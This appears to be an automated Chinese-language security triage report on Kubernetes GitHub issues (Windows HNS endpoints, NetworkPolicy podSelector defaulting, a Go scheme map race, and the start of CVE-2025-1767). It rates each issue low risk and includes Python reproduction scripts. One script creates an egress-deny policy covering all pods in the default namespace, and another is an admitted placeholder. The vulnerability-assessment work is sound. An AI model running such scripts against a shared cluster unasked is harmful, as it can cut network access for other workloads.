5.  **其他安全风险：** 该问题没有直接导致命令执行、容器逃逸、权限提升、信息泄露等高风险安全问题（规则7）。虽然影响了容器的网络可用性，但并未破坏节点或集群的整体安全性。也没有迹象表明低权限用户能利用此问题影响其他用户（规则8）。

**CVSS 3.1 评估（非正式）：**
*   **AV:N** (攻击者通过K8s API交互)
*   **AC:H** (需要特定顺序的操作、IP重用、LoadBalancer Service等复杂条件)
*   **PR:H** (需要创建/删除Pod和Service的权限)
*   **UI:N**
*   **S:U** (影响范围仅限特定容器的网络，未改变安全域)
*   **C:N**
*   **I:N**
*   **A:L** (导致部分新容器的网络不可用)

综合评分较低，属于Low级别。

**复现过程：**

```python
# 根据风险判断标准，此问题为低风险，无需提供复现脚本。
# 低风险问题的原因在于其本质是功能性缺陷导致的可用性问题，
# 且利用该问题进行拒绝服务攻击需要较高的 Kubernetes 集群权限（创建/删除 Pod 和 Service），
# 不满足高风险定义。
# 如果需要模拟该场景用于测试，可以按照 Issue 中描述的步骤手动操作 Kubernetes 资源。

print("该Issue被评定为低风险，根据要求，无需生成POC脚本。")
```


**解释说明：**

该Issue描述的问题是Windows HNS Endpoint在特定IP地址重用场景下创建失败，导致新Windows容器网络不可用的功能性Bug。虽然理论上拥有高权限的攻击者可以尝试利用此Bug对新部署的、获得特定IP的Windows容器进行网络拒绝服务，但这需要能够控制Pod和LoadBalancer Service的生命周期，属于较高权限操作。根据风险判断标准第5条，此类需要较高权限才能触发的DoS攻击不应被评为高风险。该问题不涉及命令执行、提权、信息泄露等严重安全后果。因此，该问题被评定为**低风险**，无需提供复现POC脚本。如果需要验证此问题，建议在测试环境中遵循Issue描述的步骤手动创建和删除相关资源。

---


## Issue #130896 Required field is not actually required

- Issue 链接：[#130896](https://github.com/kubernetes/kubernetes/issues/130896)

### Issue 内容

#### What happened?

I am trying to solve the mystery of the "required" podSelector field in NetworkPolicy spec. It says that the field is "not optional" https://github.com/kubernetes/api/blob/c3130ba7ba2323372534032dd3153bf331fc59e2/networking/v1/types.go#L66-L68 but at the same time you can create a netpol without podSelector even being set, and it will be populated to the empty selector.
https://github.com/kubernetes/community/blob/master/contributors/devel/sig-architecture/api-conventions.md#optional-vs-required says
> The API server should not allow POSTing or PUTing a resource with this (required) field unset.

The fun part is that multi-netpol has coped fields from the netpol https://github.com/k8snetworkplumbingwg/multi-networkpolicy/blob/master/pkg/apis/k8s.cni.cncf.io/v1beta2/types.go#L65C2-L65C55
and (because it is a crd?) it doesn't allow this filed to be unset and returns "The MultiNetworkPolicy is invalid: spec.podSelector: Required value"

#### What did you expect to happen?

NetworkPolicy with empty podSelector to be rejected.
CRD and core APIs behave the same way.

#### How can we reproduce it (as minimally and precisely as possible)?
netpol.yaml
```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: egress-deny
spec:
  policyTypes:
  - Egress
```
```
$ kubectl apply -f netpol.yaml
networkpolicy.networking.k8s.io/egress-deny created
$ kubectl get networkpolicy -oyaml
apiVersion: v1
items:
- apiVersion: networking.k8s.io/v1
  kind: NetworkPolicy
  metadata:
    ...
  spec:
    podSelector: {}
    policyTypes:
    - Egress
kind: List
metadata:
  resourceVersion: ""
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.31.1
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了Kubernetes原生`NetworkPolicy` API资源的一个行为：尽管API定义中`spec.podSelector`字段被标记为必需（"not optional"），但用户实际上可以在不指定该字段的情况下成功创建`NetworkPolicy`资源。当用户这样做时，Kubernetes API服务器会自动将`spec.podSelector`字段填充为一个空的选择器（`{}`）。

根据Kubernetes的文档，空的选择器`podSelector: {}`会匹配该NetworkPolicy所在命名空间下的*所有*Pod。

该Issue的核心在于API行为与API定义（以及API约定文档）之间的不一致性。提交者期望API服务器拒绝缺少`podSelector`字段的`NetworkPolicy`创建请求，或者至少让原生API和CRD（如`MultiNetworkPolicy`）在此行为上保持一致（`MultiNetworkPolicy` CRD会拒绝缺少该字段的请求）。

从安全角度分析：
1.  **潜在影响**：如果用户预期创建一个只应用于特定Pod的`NetworkPolicy`，但忘记填写`podSelector`，该策略将被意外地应用于命名空间中的所有Pod。如果这是一个限制性策略（例如，默认拒绝所有出口流量，如Issue中的`egress-deny`示例），它可能导致命名空间中所有服务（或至少是那些依赖于被阻止流量的服务）的意外中断，构成一种拒绝服务（DoS）。反之，如果在一个默认拒绝的环境中，一个本意是小范围允许的策略被错误地应用到所有Pod，则可能导致过度暴露。
2.  **触发条件**：攻击者（或误操作的用户）需要拥有在目标命名空间中创建`NetworkPolicy`资源的权限。
3.  **与规则的对应关系**：
    *   规则3：这是一个安全问题，因为它可能导致意外的网络策略应用，潜在影响是可用性（DoS）或策略绕过（取决于策略内容和默认网络策略）。CVSS评分考虑Availability影响可能为High。
    *   规则5：该问题导致的DoS需要攻击者拥有`create`权限（非只读）。根据规则5，当DoS攻击需要非只读权限（如创建、修改）时，不应判断为高风险。因此，尽管潜在Availability影响可能很高，但利用条件要求了创建权限，需要降级处理。
    *   规则7：该问题不直接导致命令执行、容器逃逸或提权。
    *   规则8：该问题发生在一个命名空间内，一个有权限创建NetworkPolicy的用户（通常是该命名空间的管理员或开发者）创建的策略会影响该命名空间内的所有Pod，可能影响到同一命名空间内运行的其他用户或服务的应用。但这仍局限于该用户有权限操作的范围内。

**结论**：该问题是Kubernetes API实现与定义之间的不一致性，可能导致用户在配置NetworkPolicy时产生预期之外的行为。由于空选择器`{}`会匹配命名空间中的所有Pod，错误配置可能导致对命名空间内所有服务的拒绝服务（DoS）或意外的网络暴露。然而，利用此问题需要攻击者拥有创建`NetworkPolicy`的权限。根据风险判断标准第5条，需要创建权限才能触发的DoS攻击不应评定为高风险。因此，该问题被评定为低风险。

**复现过程：**

```python
import time
import logging
import uuid
from kubernetes import config, client
from kubernetes.client.rest import ApiException

# 配置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 全局超时设置 (秒)
GLOBAL_TIMEOUT = 120

def main():
    start_time = time.time()
    operation_successful = False
    policy_name = f"test-poc-netpol-{uuid.uuid4().hex[:8]}"
    namespace = "default" # 在默认命名空间中测试

    api_client = None
    networking_v1_api = None

    try:
        # 尝试加载 Kubernetes 配置
        try:
            # 假设 kubeconfig 在默认位置 ~/.kube/config
            config.load_kube_config()
            logging.info("成功加载 Kubernetes 配置。")
            api_client = client.ApiClient()
            networking_v1_api = client.NetworkingV1Api(api_client)
        except Exception as e:
            logging.error(f"无法加载 Kubernetes 配置: {e}")
            logging.error("请确保 KUBECONFIG 环境变量已设置或配置文件位于 ~/.kube/config")
            return # 无法连接集群，提前退出

        # 定义 NetworkPolicy 对象 (不包含 podSelector)
        policy_body = {
            "apiVersion": "networking.k8s.io/v1",
            "kind": "NetworkPolicy",
            "metadata": {
                "name": policy_name,
                "namespace": namespace
            },
            "spec": {
                "policyTypes": ["Egress"]
                # podSelector 字段故意省略
            }
        }

        logging.info(f"尝试在命名空间 '{namespace}' 中创建 NetworkPolicy '{policy_name}' (无 podSelector)...")

        # 创建 NetworkPolicy
        try:
            # 设置请求超时
            networking_v1_api.create_namespaced_network_policy(
                namespace=namespace,
                body=policy_body,
                _request_timeout=30 # 为API调用设置超时
            )
            logging.info(f"NetworkPolicy '{policy_name}' 创建成功。")
            operation_successful = True # 标记创建成功，以便后续读取和清理

            # 检查是否超时
            if time.time() - start_time > GLOBAL_TIMEOUT:
                logging.warning("操作超时。")
                return

        except ApiException as e:
            # 如果API服务器按预期拒绝了（虽然我们知道它不会），这里会捕获
            # 或者如果发生其他API错误
            logging.error(f"创建 NetworkPolicy 时发生 API 错误: {e.status} - {e.reason}")
            logging.error(f"响应体: {e.body}")
            # 如果是因为权限不足等原因失败，脚本也应终止
            return
        except Exception as e:
            logging.error(f"创建 NetworkPolicy 时发生未知错误: {e}")
            return

        # 如果创建成功，尝试读取并验证 podSelector
        if operation_successful:
            logging.info(f"等待短暂时间后读取 NetworkPolicy '{policy_name}'...")
            time.sleep(2) # 等待API对象传播

            # 检查是否超时
            if time.time() - start_time > GLOBAL_TIMEOUT:
                logging.warning("操作超时。")
                return

            try:
                # 设置请求超时
                retrieved_policy = networking_v1_api.read_namespaced_network_policy(
                    name=policy_name,
                    namespace=namespace,
                    _request_timeout=30 # 为API调用设置超时
                )
                logging.info(f"成功读取 NetworkPolicy '{policy_name}'。")

                # 验证 podSelector 是否存在且为空字典 {}
                if hasattr(retrieved_policy.spec, 'pod_selector') and retrieved_policy.spec.pod_selector == {}:
                    logging.info("验证成功：API 服务器自动添加了空的 'podSelector: {}'.")
                    print("\n--- 复现结果 ---")
                    print(f"Issue 复现成功: 创建不带 spec.podSelector 的 NetworkPolicy 时，API 服务器自动填充了 'podSelector: {{}}'.")
                    print("--- 复现结果 ---")
                else:
                    logging.warning("验证失败：读取到的 NetworkPolicy 不包含预期的空 podSelector。")
                    logging.warning(f"读取到的 spec: {retrieved_policy.spec}")
                    print("\n--- 复现结果 ---")
                    print(f"Issue 复现失败: 未能验证自动填充 'podSelector: {{}}'.")
                    print("--- 复现结果 ---")

            except ApiException as e:
                logging.error(f"读取 NetworkPolicy '{policy_name}' 时发生 API 错误: {e.status} - {e.reason}")
            except Exception as e:
                logging.error(f"读取 NetworkPolicy 时发生未知错误: {e}")

    finally:
        # 清理：无论成功与否，都尝试删除创建的 NetworkPolicy
        if operation_successful and networking_v1_api:
            # 检查是否超时
            if time.time() - start_time > GLOBAL_TIMEOUT:
                logging.warning("清理操作因超时而被跳过。请手动清理 NetworkPolicy: " + policy_name)

            else:
                logging.info(f"开始清理: 删除 NetworkPolicy '{policy_name}'...")
                try:
                     # 设置请求超时
                    networking_v1_api.delete_namespaced_network_policy(
                        name=policy_name,
                        namespace=namespace,
                        body=client.V1DeleteOptions(),
                        _request_timeout=30 # 为API调用设置超时
                    )
                    logging.info(f"NetworkPolicy '{policy_name}' 删除成功。")
                except ApiException as e:
                    # 如果资源已不存在或其他API错误
                    if e.status == 404:
                         logging.info(f"NetworkPolicy '{policy_name}' 已不存在，无需删除。")
                    else:
                         logging.error(f"删除 NetworkPolicy 时发生 API 错误: {e.status} - {e.reason}")
                         logging.warning(f"请手动清理 NetworkPolicy '{policy_name}' 在命名空间 '{namespace}'。")
                except Exception as e:
                    logging.error(f"删除 NetworkPolicy 时发生未知错误: {e}")
                    logging.warning(f"请手动清理 NetworkPolicy '{policy_name}' 在命名空间 '{namespace}'。")

        else:
            logging.info("未创建 NetworkPolicy 或无法连接 API，无需清理。")

        end_time = time.time()
        logging.info(f"脚本执行完毕，总耗时: {end_time - start_time:.2f} 秒。")

# 直接调用 main 函数
main()
```


**解释说明：**

该Python脚本使用官方的`kubernetes` Python客户端库来复现Issue中描述的行为。

1.  **加载配置**: 脚本首先尝试从默认位置（`~/.kube/config`）加载Kubernetes集群的访问配置。如果失败，会打印错误信息并退出。
2.  **准备**: 定义一个唯一的`NetworkPolicy`名称（包含UUID防止冲突）和测试将要使用的命名空间（默认为`default`）。
3.  **定义策略**: 创建一个Python字典来表示`NetworkPolicy`资源。关键在于，这个字典的`spec`部分故意省略了`podSelector`字段，正如Issue中描述的那样。
4.  **创建策略**: 使用`NetworkingV1Api`的`create_namespaced_network_policy`方法尝试在指定的命名空间中创建这个没有`podSelector`的`NetworkPolicy`。
5.  **验证**: 如果创建成功，脚本会短暂暂停（等待资源状态更新），然后使用`read_namespaced_network_policy`方法读取刚刚创建的`NetworkPolicy`对象。
6.  **检查结果**: 脚本检查返回的`NetworkPolicy`对象的`spec`中是否存在`pod_selector`字段，并且其值是否为一个空字典（`{}`）。如果符合预期，则打印成功复现的消息；否则打印失败信息和读取到的`spec`内容。
7.  **清理**: 在`finally`块中，脚本确保尝试删除之前创建的`NetworkPolicy`资源，以保持集群环境的清洁。即使在创建或验证过程中出现错误，只要策略被成功创建过，清理步骤也会尝试执行。
8.  **超时与错误处理**: 脚本包含基本的错误处理（例如API异常）和日志记录。同时，设置了全局超时（2分钟）和API调用级别的超时（30秒），以防止脚本长时间阻塞。

运行此脚本需要安装`kubernetes` Python库 (`pip install kubernetes`)，并且需要有访问目标Kubernetes集群并能在`default`命名空间创建`NetworkPolicy`的权限。脚本执行结果会直接打印到控制台，明确指出是否成功复现了Issue中描述的API服务器自动填充`podSelector: {}`的行为。

---


## Issue #130809 k8s.io/apimachinery/pkg/runtime.(*SchemeBuilder).AddToScheme：fatal error: concurrent map read and map write

- Issue 链接：[#130809](https://github.com/kubernetes/kubernetes/issues/130809)

### Issue 内容

#### What happened?

In a process that integrates multiple Go goroutines, if these goroutines call the runtime module to modify scheme's map type data, concurrent read-write issues with the map may arise.

`2025/03/06 07:01:26 LogFormatter is nil or boolean, use default LogFormatter.
2025/03/06 07:01:26 [GoF2Logger] Log init end
2025/03/06 07:01:26 LogFormatter is nil or boolean, use default LogFormatter.
2025/03/06 07:01:26 [GoF2Logger] Log init end
I0306 07:01:31.962969       1 leaderelection.go:254] attempting to acquire leader lease kube-system/caascontroller...
I0306 07:01:31.991437       1 leaderelection.go:268] successfully acquired lease kube-system/caascontroller
fatal error: concurrent map read and map write

goroutine 137 [running]:
k8s.io/apimachinery/pkg/runtime.(*Scheme).ObjectKinds(0x40003c5030, {0xaaaab92abaa8?, 0x400057acf0?})
	k8s.io/apimachinery@v0.30.3/pkg/runtime/scheme.go:263 +0xc0
k8s.io/apimachinery/pkg/runtime.(*parameterCodec).EncodeParameters(0xaaaaba96d120, {0xaaaab92abaa8, 0x400057acf0}, {{0xaaaab8091b2b, 0x5}, {0xaaaab8090091, 0x2}})
	k8s.io/apimachinery@v0.30.3/pkg/runtime/codec.go:190 +0x4c
k8s.io/client-go/rest.(*Request).SpecificallyVersionedParams(0x400061b440, {0xaaaab92abaa8?, 0x400057acf0?}, {0xaaaab92abda0?, 0xaaaaba96d120?}, {{0xaaaab8091b2b?, 0x8?}, {0xaaaab8090091?, 0x400079c0d8?}})
	k8s.io/client-go@v0.30.3/rest/request.go:379 +0x5c
k8s.io/client-go/rest.(*Request).VersionedParams(...)
	k8s.io/client-go@v0.30.3/rest/request.go:372
k8s.io/client-go/gentype.(*Client[...]).Watch(0xaaaab809b7c0, {0xaaaab92cefc8?, 0xaaaabaa00aa0}, {{{0x0, 0x0}, {0x0, 0x0}}, {0x40002ed861, 0xf}, {0x0, ...}, ...})
	k8s.io/client-go@v0.30.3/gentype/type.go:220 +0x134
k8s.io/client-go/informers/batch/v1.NewFilteredJobInformer.func2({{{0x0, 0x0}, {0x0, 0x0}}, {0x0, 0x0}, {0x0, 0x0}, 0x0, 0x1, ...})
	k8s.io/client-go@v0.30.3/informers/batch/v1/job.go:71 +0x10c
k8s.io/client-go/tools/cache.(*ListWatch).Watch(0x0?, {{{0x0, 0x0}, {0x0, 0x0}}, {0x0, 0x0}, {0x0, 0x0}, 0x0, ...})
	k8s.io/client-go@v0.30.3/tools/cache/listwatch.go:115 +0x48
k8s.io/client-go/tools/cache.(*Reflector).watchList(0x40004960f0, 0x40005491a0)
	k8s.io/client-go@v0.30.3/tools/cache/reflector.go:669 +0x3a8
k8s.io/client-go/tools/cache.(*Reflector).ListAndWatch(0x40004960f0, 0x40005491a0)
	k8s.io/client-go@v0.30.3/tools/cache/reflector.go:348 +0x150
k8s.io/client-go/tools/cache.(*Reflector).Run.func1()
	k8s.io/client-go@v0.30.3/tools/cache/reflector.go:307 +0x28
k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x10?)
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/backoff.go:226 +0x40
k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0x40000c1f40, {0xaaaab92a30c0, 0x4000418d20}, 0x1, 0x40005491a0)
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/backoff.go:227 +0x90
k8s.io/client-go/tools/cache.(*Reflector).Run(0x40004960f0, 0x40005491a0)
	k8s.io/client-go@v0.30.3/tools/cache/reflector.go:306 +0x184
k8s.io/client-go/tools/cache.(*controller).Run.(*Group).StartWithChannel.func2()
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/wait.go:55 +0x28
k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/wait.go:72 +0x5c
created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 133
	k8s.io/apimachinery@v0.30.3/pkg/util/wait/wait.go:70 +0x7c
...
goroutine 147 [runnable]:
reflect.FuncOf.func1(0x4000896c30)
	reflect/type.go:1829 +0x104
reflect.FuncOf({0x400038fe20, 0x2, 0xffff3cfaba18?}, {0xaaaabaa00aa0, 0x0, 0xaaaab6438b9c?}, 0x0)
	reflect/type.go:1844 +0x5f0
reflect.(*rtype).Method(0xaaaab9132e80, 0x1)
	reflect/type.go:615 +0x3ec
reflect.(*rtype).MethodByName(0xaaaab9132e80, {0xaaaab809de96, 0xc})
	reflect/type.go:651 +0x288
reflect.Value.MethodByName({0xaaaab9132e80?, 0x4000161650?, 0x4000720258?}, {0xaaaab809de96?, 0xaaaab90e6a40?})
	reflect/value.go:2117 +0x48
k8s.io/apimachinery/pkg/runtime.(*Scheme).AddKnownTypeWithName(0x40003c5030, {{0xaaaab80b2453, 0x15}, {0xaaaab8090091, 0x2}, {0xaaaab8b6bc60, 0x17}}, {0xaaaab92b70f8, 0x4000161650})
	k8s.io/apimachinery@v0.30.3/pkg/runtime/scheme.go:184 +0x408
k8s.io/apimachinery/pkg/runtime.(*Scheme).AddKnownTypes(0x40003c5030, {{0xaaaab80b2453?, 0xffff3cfabb00?}, {0xaaaab8090091?, 0x4000720488?}}, {0x4000720418?, 0x24?, 0xffff3d12b9d8?})
	k8s.io/apimachinery@v0.30.3/pkg/runtime/scheme.go:148 +0x124
github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.buildCRDClientV1.func1.1(0x40003c5030)
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/backend/k8s/k8s.go:700 +0x58c
k8s.io/apimachinery/pkg/runtime.(*SchemeBuilder).AddToScheme(...)
	k8s.io/apimachinery@v0.30.3/pkg/runtime/scheme_builder.go:29
github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.buildCRDClientV1.func1()
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/backend/k8s/k8s.go:742 +0x13c
sync.(*Once).doSlow(0x40005c8b48?, 0x40007208e0?)
	sync/once.go:74 +0x100
sync.(*Once).Do(...)
	sync/once.go:65
github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.buildCRDClientV1({{0x4000131d40, 0x15}, {0x0, 0x0}, {{0x0, 0x0}, {0x0, 0x0}, 0x0, {0x0, ...}}, ...})
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/backend/k8s/k8s.go:696 +0x1e4
github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.NewKubeClientV2(0x40007c1448)
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/backend/k8s/k8s.go:280 +0x90
github.com/projectcalico/calico/libcalico-go/lib/clientv3.NewFromConfig(0xaaaab809bb1a?)
	github.com/projectcalico/calico@v0.0.0/libcalico-go/lib/clientv3/client.go:88 +0x24
controller/src/base.InitClientWithCfg(0x40007c1448)
	controller@v0.0.0/src/base/client.go:71 +0x9c
caascontroller/cmd/caascontroller/controllers.initConfig(0x40007c1448)
	caascontroller/cmd/caascontroller/controllers/networkcontroller.go:22 +0x54
caascontroller/cmd/caascontroller/controllers.runNetworkController({0xaaaab92cef20, 0x4000710f50}, 0x100000000000000?, {0xaaaab92fb100, 0x40003c7a40})
	caascontroller/cmd/caascontroller/controllers/networkcontroller.go:26 +0x30
created by caascontroller/cmd/caascontroller/controllers.startNetworkController in goroutine 103
	caascontroller/cmd/caascontroller/controllers/controllers.go:163 +0xf4`

#### What did you expect to happen?

A process integrating multiple service modules will not cause the process to restart due to concurrent read-write operations on scheme data.

#### How can we reproduce it (as minimally and precisely as possible)?

In a process, several modules with scheme operations are launched via goroutines.

#### Anything else we need to know?

It is recommended to add read-write locks to the map data structure under the scheme.

![Image](https://github.com/user-attachments/assets/25f2f3d6-7c80-4c57-90f5-e99e0276b97c)

#### Kubernetes version

<details>
Client Version: v1.31.1
Server Version: v1.31.1
```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该 Issue 描述了一个在 Go 语言程序中因并发读写 `map` 而导致的 `fatal error`（致命错误）。具体发生在 Kubernetes 的 `k8s.io/apimachinery/pkg/runtime` 包中，当多个 Go 协程（goroutine）同时尝试读取和修改（写入）同一个 `runtime.Scheme` 对象内部的 `map` 数据结构时，会触发 Go 运行时的并发安全检测机制，导致程序崩溃退出。

从提供的堆栈信息来看：
1.  `goroutine 137` 在执行 `k8s.io/apimachinery/pkg/runtime.(*Scheme).ObjectKinds`，这是一个读取操作，尝试获取某个对象的 GVK (GroupVersionKind) 信息。
2.  `goroutine 147` 在执行 `k8s.io/apimachinery/pkg/runtime.(*Scheme).AddKnownTypeWithName`，这是一个写入操作，尝试向 Scheme 中注册新的类型（如 Calico 的 CRD 类型 `github.com/projectcalico/calico/libcalico-go/lib/backend/k8s.buildCRDClientV1.func1.1` 所示）。

Go 语言原生的 `map` 类型并非并发安全。当一个协程正在写入 `map` 时，其他协程不能同时进行读取或写入操作，否则会触发 `fatal error: concurrent map read and map write` 或 `fatal error: concurrent map writes`。

这个问题本质上是一个 **竞争条件 (Race Condition)** 导致的程序稳定性问题。其直接后果是运行该程序的进程（例如一个自定义的 controller `caascontroller` 或使用了 `client-go` 并集成了如 Calico 这样会修改 Scheme 的库的组件）会崩溃退出。

**安全风险分析：**

1.  **漏洞类型：** 这主要是一个 **拒绝服务 (Denial of Service, DoS)** 问题。进程崩溃导致其提供的服务中断，需要被重启（例如被 Kubernetes deployment 自动拉起）。
2.  **触发条件：** 触发该问题需要特定的并发场景，即在程序初始化或运行时，有多个协程并发地对同一个 `runtime.Scheme` 实例进行读写操作。这通常发生在应用程序（如 Controller）启动时，并发初始化不同的 client 或者 informer，并且这些初始化过程都涉及到向 `scheme.Scheme` 注册类型（写操作），同时其他协程可能在进行 API 调用、序列化/反序列化等需要查询 Scheme 信息（读操作）的场景。
3.  **可利用性：**
    *   这更像是一个程序自身的 Bug，而不是一个典型的可被外部攻击者利用的漏洞。攻击者通常无法直接控制目标进程内部的协程调度和执行时机来精确触发这个竞争条件。
    *   触发此问题的代码路径通常位于服务进程内部，例如 Controller 的初始化逻辑或运行时的 API 交互逻辑。
    *   根据风险判断标准第 5 条，如果 DoS 攻击需要攻击者具备一定权限（例如能够部署或配置会触发此 bug 的 Controller，或者能够发送特定 API 请求间接触发 Controller 内部的并发行为），并且这些权限并非普通只读权限，则风险等级需要降级。在这个场景下，触发崩溃的是 Controller 自身的行为，而非外部低权限用户的直接攻击。即使 Controller 崩溃，通常也会被 Kubernetes 自动重启，造成短暂的服务不可用。
    *   该问题不涉及命令执行、容器逃逸、提权等高风险行为（标准第 7 条）。
    *   该问题发生在一个独立的 Controller 进程中，虽然该 Controller 的崩溃会影响其管理的用户资源，但不太可能让一个低权限用户直接影响到其他用户（标准第 8 条）。除非该 Controller 本身设计为多租户服务且崩溃会跨租户影响，但该 Issue 并未提供此类信息。

4.  **影响：** 主要影响是 Controller/Operator 的可用性。频繁的崩溃和重启会影响其功能的正常执行，例如无法及时响应事件、更新资源状态等。对于关键的 Controller（如 CNI 插件 Calico 的相关组件），可能导致集群网络功能异常或策略无法执行。

5.  **CVSS 3.1 评分（估算）：**
    *   AV: L (攻击向量：本地，因为是进程内部并发问题)
    *   AC: H (攻击复杂度：高，依赖精确的并发时序，不易由外部控制)
    *   PR: H (权限要求：高，通常需要部署/管理 Controller 的权限，或者需要触发 Controller 内部特定并发逻辑的权限)
    *   UI: N (用户交互：无)
    *   S: U (范围：不变，影响组件自身)
    *   C: N (机密性：无)
    *   I: N (完整性：无，主要是崩溃)
    *   A: L/M (可用性：低/中，导致组件重启，影响范围取决于组件重要性)
    *   根据 CVSS v3.1 Calculator (AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:L)，得分为 2.2 (Low)。如果可用性影响判断为 Medium (A:M)，得分为 3.8 (Low)。

**结论：** 该 Issue 描述的是一个由并发竞争条件引起的程序崩溃问题，属于拒绝服务（DoS）类型。但其触发条件源于程序内部实现，难以被外部攻击者稳定利用，且利用通常需要较高权限。根据风险判断标准，特别是第 5 条，该问题应被评为 **低风险**。

**复现过程：**

```python
# 该问题是 Go 语言实现的 Kubernetes client-go 库及其 runtime 包内部的并发问题 (race condition)。
# 具体表现为在 Go 程序中使用多个 goroutine 并发读写同一个 runtime.Scheme 对象的 map 时，
# Go runtime 会检测到并发冲突并抛出 fatal error 导致进程崩溃。
#
# Python 语言及其 Kubernetes 客户端库 (kubernetes-client/python) 具有不同的内部实现机制，
# 不存在与 Go 语言 map 并发访问完全相同的底层问题。
# Python 的字典（dict）在 CPython 实现中，大部分操作受全局解释器锁（GIL）保护，
# 虽然 GIL 不能完全防止所有多线程数据竞争问题（例如非原子操作），但不会像 Go map 一样
# 在检测到并发读写时直接触发 fatal error 崩溃。
# Python 的 Kubernetes 客户端库本身也不会直接暴露或依赖于类似 Go runtime.Scheme 的并发不安全结构。
#
# 因此，无法使用 Python 编写一个 PoC 来直接复现 Go 语言环境下的 "concurrent map read and map write" fatal error。
# 这个错误是 Go 语言特定实现和库使用方式下的产物。
#
# 要复现此问题，需要在 Go 环境下编写一个程序，模拟多个 goroutine 并发地调用
# k8s.io/apimachinery/pkg/runtime 相关函数（如 AddToScheme, ObjectKinds 等）操作同一个 Scheme 实例。

# 以下为占位符，表明无法提供有效的 Python PoC
import time
import threading

def simulate_action(action_name):
    print(f"Thread {threading.current_thread().name} starting {action_name}")
    # 模拟一些工作负载
    time.sleep(0.1)
    print(f"Thread {threading.current_thread().name} finishing {action_name}")

def main():
    print("This Python script demonstrates basic threading.")
    print("It CANNOT reproduce the Go 'concurrent map read and map write' fatal error.")
    print("The original issue is specific to Go's runtime and k8s.io/apimachinery implementation.")
    print("Reproducing the issue requires writing a Go program with concurrent Scheme modifications.")

    threads = []
    for i in range(5):
        # 模拟并发读写操作（但这里只是打印，无法触发 Go 的 map race）
        read_thread = threading.Thread(target=simulate_action, args=(f"simulated read {i}",), name=f"Reader-{i}")
        write_thread = threading.Thread(target=simulate_action, args=(f"simulated write {i}",), name=f"Writer-{i}")
        threads.append(read_thread)
        threads.append(write_thread)
        read_thread.start()
        write_thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join(timeout=10) # 设置超时避免卡死

    print("Simulated operations complete.")
    print("No Go runtime fatal error occurred because this is Python.")

# 直接调用 main 函数
main()
```


**解释说明：**

提供的 Python 脚本旨在说明为什么无法使用 Python 复现原始 Issue 中描述的 Go 语言特有的并发错误。

1.  **问题根源**：原始 Issue 的核心是 Go 语言内置 `map` 类型在并发读写时的不安全性，以及 `k8s.io/apimachinery/pkg/runtime.Scheme` 在其实现中直接使用了 `map` 且在某些场景下未（或未能完全）保护并发访问，导致 Go runtime 检测到冲突并强制程序退出。
2.  **Python 的差异**：Python 的字典 (`dict`) 和多线程模型与 Go 不同。CPython 中的 GIL 通常会序列化对 Python 对象的访问，虽然不能完全避免所有类型的竞争条件，但不会以 Go `map` 并发访问错误的方式表现出来。Python 的 Kubernetes 客户端库 (`kubernetes-client/python`) 也有其独立的内部实现，不共享 Go `client-go` 的 `runtime.Scheme` 对象或其实现细节。
3.  **脚本功能**：该 Python 脚本使用 `threading` 模块创建了多个线程来模拟并发活动。然而，这些线程执行的是简单的打印和休眠操作 (`simulate_action` 函数)，并不能与 Python Kubernetes 客户端库的内部状态进行交互以触发类似 Go 的 `map` 并发错误。
4.  **结论**：脚本运行后会正常结束，并输出提示信息，明确指出它不能复现 Go 语言的特定错误。要真正复现这个问题，必须在 Go 环境中编写代码，使用 `client-go` 或相关库，并精心设计并发场景来触发对 `runtime.Scheme` 的并发读写。修复这个问题需要在 `k8s.io/apimachinery` 库层面为 `Scheme` 的内部 `map` 访问增加适当的并发控制（例如使用 `sync.RWMutex` 读写锁），正如 Issue 中建议的那样。

---


## Issue #130786 CVE-2025-1767: GitRepo Volume Inadvertent Local Repository Access

- Issue 链接：[#130786](https://github.com/kubernetes/kubernetes/issues/130786)

### Issue 内容

**Issue Details**
A security vulnerability was discovered in Kubernetes that could allow a user with create pod permission to exploit gitRepo volumes to access local git repositories belonging to other pods on the same node.
This issue has been rated Medium ([CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N)) (score: 6.5), and assigned CVE-2025-1767.

**Am I vulnerable?**

